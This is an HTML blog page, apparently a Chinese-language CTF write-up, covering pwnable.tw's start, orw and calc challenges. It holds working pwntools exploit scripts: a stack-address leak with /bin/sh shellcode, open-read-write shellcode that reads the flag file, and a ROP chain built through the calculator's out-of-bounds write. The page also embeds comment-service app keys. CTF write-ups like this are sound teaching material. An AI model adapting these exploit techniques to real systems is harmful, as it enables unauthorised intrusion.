@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>pwnable.tw start/orw/calc | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="pwnable.tw start/orw/calc" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="start" />
+<meta property="og:description" content="start" />
+<link rel="canonical" href="http://localhost:4001/2022/08/04/pwnable-tw-start-orw-calc-writeup.html" />
+<meta property="og:url" content="http://localhost:4001/2022/08/04/pwnable-tw-start-orw-calc-writeup.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-04T04:10:47+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="pwnable.tw start/orw/calc" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-04T04:10:47+08:00","datePublished":"2022-08-04T04:10:47+08:00","description":"start","headline":"pwnable.tw start/orw/calc","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4001/2022/08/04/pwnable-tw-start-orw-calc-writeup.html"},"url":"http://localhost:4001/2022/08/04/pwnable-tw-start-orw-calc-writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4001/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">pwnable.tw start/orw/calc</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-08-04T04:10:47+08:00" itemprop="datePublished">Aug 4, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="start">start</h2>
+
+<p><strong>保护全关</strong>的32位程序。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-d</span> <span class="nt">-M</span> Intel ./start 
+
+./start:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060:	54                   	push   %esp
+ 8048061:	68 9d 80 04 08       	push   <span class="nv">$0x804809d</span>
+ 8048066:	31 c0                	xor    %eax,%eax
+ 8048068:	31 db                	xor    %ebx,%ebx
+ 804806a:	31 c9                	xor    %ecx,%ecx
+ 804806c:	31 d2                	xor    %edx,%edx
+ 804806e:	68 43 54 46 3a       	push   <span class="nv">$0x3a465443</span>
+ 8048073:	68 74 68 65 20       	push   <span class="nv">$0x20656874</span>
+ 8048078:	68 61 72 74 20       	push   <span class="nv">$0x20747261</span>
+ 804807d:	68 73 20 73 74       	push   <span class="nv">$0x74732073</span>
+ 8048082:	68 4c 65 74 27       	push   <span class="nv">$0x2774654c</span>
+ 8048087:	89 e1                	mov    %esp,%ecx
+ 8048089:	b2 14                	mov    <span class="nv">$0x14</span>,%dl
+ 804808b:	b3 01                	mov    <span class="nv">$0x1</span>,%bl
+ 804808d:	b0 04                	mov    <span class="nv">$0x4</span>,%al
+ 804808f:	<span class="nb">cd </span>80                	int    <span class="nv">$0x80</span>
+ 8048091:	31 db                	xor    %ebx,%ebx
+ 8048093:	b2 3c                	mov    <span class="nv">$0x3c</span>,%dl
+ 8048095:	b0 03                	mov    <span class="nv">$0x3</span>,%al
+ 8048097:	<span class="nb">cd </span>80                	int    <span class="nv">$0x80</span>
+ 8048099:	83 c4 14             	add    <span class="nv">$0x14</span>,%esp
+ 804809c:	c3                   	ret    
+
+0804809d &lt;_exit&gt;:
+ 804809d:	5c                   	pop    %esp
+ 804809e:	31 c0                	xor    %eax,%eax
+ 80480a0:	40                   	inc    %eax
+ 80480a1:	<span class="nb">cd </span>80                	int    <span class="nv">$0x80</span>
+</code></pre></div></div>
+
+<p>有3个syscall，一个write把一个字符串写到1，一个read从0读入字符到栈上，一个exit退出。显然read这边有个栈溢出漏洞，可以把返回地址覆盖掉。</p>
+
+<p>首先想到直接在返回地址后面写一段shellcode执行execve(“/bin/sh”, 0, 0)，想盲打打中栈地址。但是试了几次发现即使是32位的程序，也有至少19个二进制位的随机变化，要十几个小时才能打中，于是算了。
+然后想ROP试试，但是怎么想也想不出方法。
+最后想到重新执行的思想，我可以<strong>重新执行write和read</strong>，把栈上的栈地址泄露出来，这样就可以把控制流精准控制成我的shellcode了。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+
+<span class="c1"># p = process("./start")
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x14</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">mes</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">mes</span><span class="p">)</span>
+
+<span class="n">stack</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">mes</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span> <span class="o">-</span> <span class="mi">4</span>
+<span class="n">shcode_addr</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">+</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="mi">4</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'/bin/sh'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">13</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">shcode_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="sa">f</span><span class="s">'''
+mov eax, 11
+mov ebx, </span><span class="si">{</span><span class="n">stack</span><span class="si">}</span><span class="s">
+mov ecx, 0
+mov edx, 0
+int 0x80
+'''</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="orw">orw</h2>
+
+<p>程序会读入一段shellcode并执行，并且限制syscall只能调用orw。
+先用read读入/home/orw/flag，然后orw就好了。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+
+<span class="c1"># p = process(["strace", "./orw"])
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
+
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x0804A0C0</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="sa">f</span><span class="s">'''
+mov eax, 3
+xor ebx, ebx
+mov ecx, </span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
+mov edx, 20
+int 0x80
+
+mov eax, 5
+mov ebx, </span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
+xor ecx, ecx
+xor edx, edx
+int 0x80
+
+mov ebx, eax
+mov eax, 3
+mov ecx, </span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
+mov edx, 50
+int 0x80
+
+mov eax, 4
+mov ebx, 1
+mov ecx, </span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
+mov edx, 50
+int 0x80
+'''</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvS</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'/home/orw/flag'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="calc">calc</h2>
+
+<p>除了PIE，其他保护全开。
+是一个计算器，将读入的表达式转换成逆波兰表达法之后，用栈进行求值。</p>
+
+<p>主要漏洞在于，在利用栈进行求值的时候，这个存数字的栈用[0]存储栈的高度，用[1]及以上空间存储数字。
+所以当我输入 <code class="language-plaintext highlighter-rouge">+1</code> 的时候，这个1将会直接被加到栈的高度上，之后就可以通过修改栈高度+构造表达式。来达成栈以上地址任意读写（实际只用到了任意写）。</p>
+
+<p>遇到了两个坑，一是写入一个数字的时候，比这个数字低位的数字将会受到影响；二是运算数不能为0。</p>
+
+<p>前者利用倒过来写入（从上往下写）解决，后者我利用构造表达式解决（后来发现了更简单的方法，由于是将运算数与”0”进行strcmp来判断的，我可以输入000来表示0）。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+
+<span class="c1"># p = process(["strace", "./calc"])
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10100</span><span class="p">)</span>
+
+<span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0806e6d0</span>
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x080ecf00</span>
+
+<span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08070880</span>
+<span class="n">sh_str</span> <span class="o">=</span> <span class="mh">0x08051ce9</span>
+<span class="n">pop_eax</span> <span class="o">=</span> <span class="mh">0x0805c34b</span>
+<span class="n">pop_ecx_ebx</span> <span class="o">=</span> <span class="mh">0x080701d1</span>
+<span class="n">pop_edx</span> <span class="o">=</span> <span class="mh">0x080701aa</span>
+<span class="n">pop_3</span> <span class="o">=</span> <span class="mh">0x080483ac</span>
+
+<span class="c1"># 360 read
+# 361 0
+# 362 buf
+# 363 10
+</span>
+<span class="c1"># 364 pop_eax
+# 365 11
+# 366 pop_ecx_ebx
+# 367 0
+# 368 sh_str
+# 369 pop_edx
+# 370 0
+# 371 int_0x80
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'''+371+</span><span class="si">{</span><span class="n">int_0x80</span><span class="si">}</span><span class="s">/1-</span><span class="si">{</span><span class="n">int_0x80</span><span class="si">}</span><span class="s">
++370+</span><span class="si">{</span><span class="n">pop_edx</span><span class="si">}</span><span class="s">
++368+</span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">/1-</span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
++367+</span><span class="si">{</span><span class="n">pop_ecx_ebx</span><span class="si">}</span><span class="s">
++366+11
++365+</span><span class="si">{</span><span class="n">pop_eax</span><span class="si">}</span><span class="s">
++364+10
++362+</span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">/1-</span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
++361+</span><span class="si">{</span><span class="n">pop_3</span><span class="si">}</span><span class="s">
++360+</span><span class="si">{</span><span class="n">read_addr</span><span class="si">}</span><span class="s">
+'''</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvS</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </div><div id="comments"></div>
+  <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+  <a class="u-url" href="/2022/08/04/pwnable-tw-start-orw-calc-writeup.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Y² 的博客</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
